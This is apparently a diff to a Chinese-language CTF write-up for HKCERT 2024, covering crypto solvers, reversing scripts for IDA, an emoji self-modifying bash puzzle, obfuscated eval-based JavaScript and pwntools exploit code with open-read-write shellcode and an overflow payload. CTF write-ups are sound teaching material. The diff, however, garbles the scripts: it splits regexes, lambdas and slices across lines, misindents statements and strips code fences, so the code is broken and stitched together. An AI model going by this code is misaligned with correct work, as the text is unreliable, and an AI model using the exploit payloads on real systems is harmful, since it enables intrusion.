@@ -33,7 +33,7 @@ Pwn
 
 ChatGGT (1)
 
- Crypto 
+ Crypto
 
 RSA LCG (0)
 
@@ -561,7 +561,9 @@ for ea in CodeRefsTo(0x25B009, False):
     addr, length, key = get
     assert length == 86
     s = idaapi.decompile(addr)
-    l1 = re.findall(r'std::string::operator[](a1, (d+)LL)', str(s))
+    l1 = re.findall(r'std::
+string::
+operator[](a1, (d+)LL)', str(s))
     l2 = re.findall(r'^', str(s))
     l3 = re.findall(r'== (d+)', str(s))
 #    if not l3:
@@ -594,7 +596,8 @@ while True:
     else:
         break
 
-if sha1(flag[idx:idx+sz])[1] == val:
+if sha1(flag[idx:
+idx+sz])[1] == val:
     wget file1
     GALF *= value1
 else:
@@ -1123,7 +1126,8 @@ while(i < 0x100):
         print(server_response)
         hex_ouput = server_response.split(b" : ")[1] # 從服務器響應中獲取十六進制部分
         print(hex_ouput)
-    except:
+    
+except:
         pass
     finally:
         r.close()
@@ -1145,8 +1149,10 @@ sa = lambda data, content: io.sendafter(data,content)
 dbg = lambda    : gdb.attach(io)
 bk = lambda : (dbg(),pause())
 inter = lambda: io.interactive()
-l64 = lambda    :u64(io.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
-h64=lambda     :u64(io.recv(6).ljust(8,b'x00'))
+l64 = lambda    :
+u64(io.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
+h64=lambda     :
+u64(io.recv(6).ljust(8,b'x00'))
 add=0
 orw_shellcode = asm(shellcraft.open('flag') + shellcraft.read(3, add, 0x30) + shellcraft.write(1,add, 0x30))
 def dbg(c = 0):
@@ -1173,7 +1179,7 @@ inter()
 
 
 ```
-#from rich.progress import track
+    #from rich.progress import track
 from Crypto.Util.number import isPrime as is_prime
 from Crypto.Util.number import long_to_bytes
 from tqdm import tqdm
@@ -1232,7 +1238,7 @@ pars = []
 for i in range(T):
     pars += [(N//T * i, N//T * (i+1))]
 print(pars)
-#results = pool.map(func, pars)
+    #results = pool.map(func, pars)
 
 seed = 58727
 lcg = LCG(bits=128, a=181525535962623036141846439269075744717, c=115518761677956575882056543847720910703, seed=1)
@@ -1251,11 +1257,6 @@ m = pow(c, d, n)
 # 4. Converts the ciphertext to a bytearray, and prints it
 flag = long_to_bytes(m)
 print(f'{flag = }')
-```
-
-
-
-```
 from tqdm import tqdm
 import itertools
 
@@ -1329,11 +1330,6 @@ flag = bytes.fromhex(m.hex())
 print(flag)
 
 # b'hkcert24{c0mpu71n9_subs3qu3nc3s_0f_g30m3tr1c_s3qu3nc3s_1s_fun}'
-```
-
-
-
-```
 with (ㅤ`` ) {
 // 一片空白？
 }
@@ -1342,11 +1338,6 @@ function u3164(){return f="",p=[]  
 n.length-1),2==p.length&&(p[0]||p[
 1]||eval(f),f+=String.fromCharCode
 (p[0]<<4|p[1]),p=[]),!0)})}//aem1k
-```
-
-
-
-```
 array = [9, 10, 11, 12, 13, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126]
 array2 = [58, 38, 66, 88, 78, 39, 80, 125, 64, 106, 48, 49, 98, 32, 42, 59, 126, 93, 33, 56, 112, 120, 60, 117, 111, 45, 87, 35, 10, 68, 61, 77, 11, 55, 121, 74, 107, 104, 65, 63, 46, 110, 34, 41, 102, 97, 81, 12, 47, 51, 103, 89, 115, 75, 54, 92, 90, 76, 113, 122, 114, 52, 72, 70, 50, 94, 91, 73, 84, 95, 36, 82, 124, 53, 108, 101, 9, 13, 44, 96, 67, 85, 116, 123, 100, 37, 43, 119, 71, 105, 118, 69, 99, 79, 86, 109, 62, 83, 40, 57]
 array3 = [16684662107559623091, 13659980421084405632, 11938144112493055466, 17764897102866017993, 11375978084890832581, 14699674141193569951]
@@ -1366,11 +1357,6 @@ d = dict(zip(array2, array))
 l = [d[x] for x in l]
 print(l)
 print(bytes(l))
-```
-
-
-
-```
 from z3 import *
 
 flag = b'hkcert24{'
@@ -1418,11 +1404,6 @@ while True:
 
 # flag += b'1}'
 # print(flag)
-```
-
-
-
-```
 sser.cpython-312.pyc (Python 3.12)
 [Code]
     File Name: sser.py
@@ -1631,11 +1612,6 @@ sser.cpython-312.pyc (Python 3.12)
         498     CALL                            1
         506     POP_TOP                         
         508     RETURN_CONST                    1: None
-```
-
-
-
-```
 import os
 import requests
 from Crypto.Cipher import AES
@@ -1659,11 +1635,6 @@ cipher = AES.new(key, AES.MODE_CFB, iv)
 # c1 = cipher.encrypt(flag)
 # assert c0 == c1
 print(cipher.decrypt(c0))
-```
-
-
-
-```
 from z3 import *
 
 r = [0x0000000089E216C7, 0x000000008BBA1F53, 0x00000000EEDAC203, 0x00000000A3A18665, 0x0000000094ED1363, 0x00000000F962506F, 0x00000000D9CE8AAF, 0x00000000B1375EA5, 0x00000000B5F3A527, 0x00000000864090E5, 0x000000008B69129D, 0x00000000E93765CB, 0x00000000E69D6F8F, 0x00000000EF102543, 0x00000000BF72B95B, 0x00000000B92FC919, 0x00000000BB5F04B1, 0x00000000D6DB2593, 0x00000000AF09D917, 0x00000000E6CACC41, 0x00000000F6E60F6F, 0x00000000C11F4CB5, 0x00000000F7617AB7, 0x00000000FA6A6B91, 0x00000000B45D2387, 0x0000000083E969C3, 0x00000000B21505B3, 0x00000000C7455743, 0x00000000CBBB1795, 0x00000000C5B265AD, 0x00000000D65D3205, 0x00000000EF73C749, 0x00000000BD0DF89D, 0x00000000D13BD13D, 0x0000000091E98453, 0x0000000092BED8BF, 0x00000000F96B4745, 0x000000008B3639CF, 0x00000000E1CF7EC1, 0x00000000F79644BF, 0x00000000C0CC4405, 0x00000000C29357D5, 0x00000000DB8B19EF, 0x00000000B2432FCD, 0x00000000C01582B7, 0x00000000E03B43F3, 0x00000000805EDEA7, 0x00000000DDB2CB1D, 0x00000000BACBA2A1, 0x00000000E4F71B79, 0x00000000963367C3, 0x00000000BAC0308F, 0x00000000B371D959, 0x00000000CA966811, 0x00000000933E6A4F, 0x00000000854AEF83, 0x00000000B7BB6693, 0x00000000BF1CE60F, 0x00000000BB3F20F7, 0x00000000E04451E5, 0x0000000095BF97C9, 0x00000000D4349163, 0x000000008C8EF06D, 0x00000000EA039ADF]
@@ -1689,11 +1660,6 @@ flag = b''
 for x in l:
     flag += x.to_bytes(4, 'big')
 print(flag)
-```
-
-
-
-```
 for ea in CodeRefsTo(0x25B009, False): # address of decompress
     get = []
     while True:
@@ -1711,11 +1677,6 @@ for ea in CodeRefsTo(0x25B009, False): # address of decompress
         patch_byte(ea, b)
     create_insn(addr)
     add_func(addr)
-```
-
-
-
-```
 import re
 
 data = []
@@ -1731,18 +1692,15 @@ for ea in CodeRefsTo(0x25B009, False):
     addr, length, key = get
     assert length == 86
     s = idaapi.decompile(addr)
-    l1 = re.findall(r'std::string::operator[](a1, (d+)LL)', str(s))
+    l1 = re.findall(r'std::
+string::
+operator[](a1, (d+)LL)', str(s))
     l2 = re.findall(r'^', str(s))
     l3 = re.findall(r'== (d+)', str(s))
 #    if not l3:
 #        print(hex(addr))
     data.append((int(l1[0]), int(l1[1]), int(l3[0]))) # 索引0 索引1 目標值
 print(data)
-```
-
-
-
-```
 # dst從上面拿的
 dst = [(48, 49, 88), (14, 15, 93), (11, 12, 10), (51, 52, 70), (42, 43, 100), (12, 13, 57), (37, 38, 54), (21, 22, 9), (26, 27, 87), (1, 2, 8), (7, 8, 79), (22, 23, 56), (49, 50, 27), (45, 46, 30), (40, 41, 49), (29, 30, 28), (44, 45, 30), (19, 20, 72), (53, 54, 78), (39, 40, 106), (10, 11, 95), (46, 47, 50), (6, 7, 6), (38, 39, 92), (3, 4, 23), (23, 24, 60), (35, 36, 4), (13, 14, 50), (8, 9, 8), (41, 42, 94), (2, 3, 6), (20, 21, 95), (18, 19, 31), (47, 48, 89), (52, 53, 65), (5, 6, 70), (25, 26, 84), (50, 51, 67), (15, 16, 84), (30, 31, 88), (17, 18, 87), (28, 29, 43), (4, 5, 6), (0, 1, 3), (9, 10, 64), (31, 32, 111), (33, 34, 28), (27, 28, 108), (43, 44, 11), (24, 25, 83), (36, 37, 106), (32, 33, 43), (16, 17, 85), (34, 35, 89)]
 got = []
@@ -1767,22 +1725,13 @@ while True:
         print(bytes(l))
     else:
         break
-```
-
-
-
-```
-if sha1(flag[idx:idx+sz])[1] == val:
+if sha1(flag[idx:
+idx+sz])[1] == val:
     wget file1
     GALF *= value1
 else:
     wget file2
     GALF *= value2
-```
-
-
-
-```
 #!/bin/bash
 
 function 🍋() {
@@ -1796,11 +1745,6 @@ function 💘() { 🍋 $4 $7 $3 $1 $2 $5 $6; }
 👚 👣 👺 👅 👳 👱 👄 👂
 # 原腳本中的emoji，省略
 👍 👅 👙 👣 👄 💖 👓 👂
-```
-
-
-
-```
 # 從前面的腳本中輸出的命令及其順序
 emoji_data = '''👱 👄 👅 👺 👣 👳 👂
 👲 👄 👅 👣 💅 👋 👂
@@ -2214,11 +2158,6 @@ if __name__ == '__main__':
     for i in range(FLAGLEN):
         d.update({i: set()})
     dfs((emoji_idx("❤️"), 0, deepcopy(d), deepcopy(d), [PH]*FLAGLEN, 0))
-```
-
-
-
-```
 ### 猜測時間到！
 ## flag格式
 flag_chars[0] = 'h'
@@ -2294,11 +2233,6 @@ flag_chars[44] = '_' # 42-44的條件中44都有可能是底線，試試
 # seemingly_begign(??? begin?)_bash_scripts_co..._be_dangerous_when_they_are_self_modifying
 # could be?
 flag_chars[41] = 'u'
-```
-
-
-
-```
 from pwn import *
 
 # context.log_level = "debug" # 最小化日誌記錄
@@ -2317,17 +2251,13 @@ while(i < 0x100):
         print(server_response)
         hex_ouput = server_response.split(b" : ")[1] # 從服務器響應中獲取十六進制部分
         print(hex_ouput)
-    except:
+    
+except:
         pass
     finally:
         r.close()
-```
-
-
-
-```
 from pwn import *
-#from Crypto.Util.number import bytes_to_long,bytes_to_long
+    #from Crypto.Util.number import bytes_to_long,bytes_to_long
 from ae64 import AE64
 import sys
 #--------------------setting context---------------------
@@ -2343,8 +2273,10 @@ sa = lambda data, content: io.sendafter(data,content)
 dbg = lambda    : gdb.attach(io)
 bk = lambda : (dbg(),pause())
 inter = lambda: io.interactive()
-l64 = lambda    :u64(io.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
-h64=lambda     :u64(io.recv(6).ljust(8,b'x00'))
+l64 = lambda    :
+u64(io.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
+h64=lambda     :
+u64(io.recv(6).ljust(8,b'x00'))
 add=0
 orw_shellcode = asm(shellcraft.open('flag') + shellcraft.read(3, add, 0x30) + shellcraft.write(1,add, 0x30))
 def dbg(c = 0):
@@ -2358,9 +2290,9 @@ def dbg(c = 0):
 #---------------------------------------------------------
 filename = "./chal"
 io = process(filename)
-#io = remote("39.106.48.123",34015)
+    #io = remote("39.106.48.123",34015)
 elf = ELF(filename)
-#libc=ELF("./libc-2.31-0kylin9.2k0.2.so")
+    #libc=ELF("./libc-2.31-0kylin9.2k0.2.so")
 #初始化完成---------------------------------------------------------
 payload=b'EXIT'
 payload+=payload.ljust(256+4,b'a')
